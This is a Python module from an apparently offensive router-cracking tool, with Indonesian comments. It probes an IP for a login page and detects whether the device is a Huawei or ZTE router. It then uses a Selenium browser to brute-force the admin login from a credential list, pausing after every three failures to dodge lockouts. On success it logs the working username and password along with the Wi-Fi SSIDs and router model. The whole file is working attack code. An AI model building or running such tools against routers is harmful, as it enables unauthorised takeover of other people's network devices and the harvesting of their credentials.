from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional, List, Tuple

from modules.prober import RouterProber
from modules.drivers.browser import create_driver
from utils.logger import Logger
from utils.cooldown import cooldown_bar
from output.writer import ResultWriter

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

FAIL_BEFORE_COOLDOWN = 3
COOLDOWN_SECONDS = 60


@dataclass
class ScanResult:
    ip: str
    url: str
    username: str
    password: str
    login_success: bool = False
    ssid: Optional[str] = None
    ssid_5g: Optional[str] = None
    router_model: Optional[str] = None
    error: Optional[str] = None
    extra: dict = field(default_factory=dict)


class RouterEngine:
    def __init__(
        self,
        ip: str,
        credentials: List[Tuple[str, str]],
        timeout: int = 20,
        output_file: Optional[str] = None,
        logger: Optional[Logger] = None,
    ):
        self.ip = ip
        self.credentials = credentials
        self.timeout = timeout
        self.output_file = output_file
        self.output_file = output_file
        self.log = logger or Logger()

    def run(self) -> Optional[ScanResult]:

        # ── Step 1: Probe cepat via requests ──────────────────────────
        self.log.step("[%s] Probing ...", self.ip)
        login_url = RouterProber(ip=self.ip, logger=self.log).probe()
        if login_url is None:
            self.log.warn("[%s] Tidak ada form login — SKIP", self.ip)
            return None
        self.log.success("[%s] Form login ditemukan → %s", self.ip, login_url)

        # ── Step 2: Buka browser SEKALI ───────────────────────────────
        self.log.step("[%s] Membuka browser ...", self.ip)
        try:
            driver = create_driver(logger=self.log)
        except RuntimeError as e:
            self.log.error("Gagal membuka browser: %s", e)
            return None

        try:
            return self._bruteforce(driver, login_url)
        finally:
            try:
                driver.quit()
                self.log.debug("Browser ditutup.")
            except Exception:
                pass

    def _bruteforce(self, driver, login_url: str) -> Optional[ScanResult]:
        from modules.profiles import ALL_PROFILES

        # ── Detect profil & template (browser sudah terbuka) ──────────
        self.log.step("[%s] Mendeteksi profil router ...", self.ip)
        profile = None
        for p in ALL_PROFILES:
            try:
                # Buka halaman login untuk deteksi — browser sudah ada
                driver.get(login_url)
                WebDriverWait(driver, self.timeout).until(
                    EC.presence_of_element_located((By.ID, "txt_Username"))
                )
                # Cek apakah profil ini cocok (cukup cek elemen kunci)
                if p == ALL_PROFILES[0]:  # huawei
                    if driver.find_elements(By.ID, "txt_Username"):
                        profile = p
                        break
                elif p == ALL_PROFILES[1]:  # zte
                    if driver.find_elements(By.ID, "Frm_Username"):
                        profile = p
                        break
            except Exception:
                continue

        if profile is None:
            self.log.warn("[%s] Profil tidak dikenali — SKIP", self.ip)
            return None

        self.log.success("[%s] Profil: %s", self.ip, profile.PROFILE_NAME)
        self.log.step(
            "[%s] Mulai brute-force (%d kredensial)", self.ip, len(self.credentials)
        )

        fail_count = 0

        for idx, (username, password) in enumerate(self.credentials, start=1):
            self.log.step(
                "[%s] (%d/%d) Mencoba → %s:%s",
                self.ip,
                idx,
                len(self.credentials),
                username,
                password,
            )

            # Cooldown
            if fail_count > 0 and fail_count % FAIL_BEFORE_COOLDOWN == 0:
                cooldown_bar(
                    seconds=COOLDOWN_SECONDS,
                    message=f"[{self.ip}] {fail_count}x gagal, jeda",
                )

            # Kembali ke halaman login (tanpa restart browser)
            try:
                driver.get(login_url)
                WebDriverWait(driver, self.timeout).until(
                    EC.visibility_of_element_located((By.ID, "txt_Username"))
                )
            except Exception:
                # Jika halaman tidak load, coba sekali lagi
                try:
                    driver.get(login_url)
                except Exception as e:
                    self.log.error("Gagal load halaman login: %s", e)
                    break

            # Jalankan profil
            try:
                data = profile.run(
                    driver=driver,
                    ip=self.ip,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                )
            except Exception as exc:
                self.log.debug("Error profil: %s", exc)
                data = None

            if data:
                result = ScanResult(
                    ip=self.ip,
                    url=login_url,
                    username=username,
                    password=password,
                    login_success=True,
                    ssid=data.get("ssid_2g"),
                    ssid_5g=data.get("ssid_5g"),
                    router_model=data.get("model"),
                )
                self.log.success(
                    "[%s] LOGIN BERHASIL → %s:%s", self.ip, username, password
                )
                self._write(result)
                return result
            else:
                fail_count += 1
                self.log.warn(
                    "[%s] Gagal (%d) → %s:%s", self.ip, fail_count, username, password
                )

        failed = ScanResult(
            ip=self.ip,
            url=login_url,
            username="",
            password="",
            login_success=False,
            error=f"Semua {len(self.credentials)} kredensial gagal",
        )
        self._write(failed)
        return None

    def _write(self, result: ScanResult):
        self.log.info("")
        self.log.info("─" * 52)
        self.log.print_result(result)
        self.log.info("─" * 52)
        if self.output_file:
            ResultWriter(self.output_file, logger=self.log).write(result)
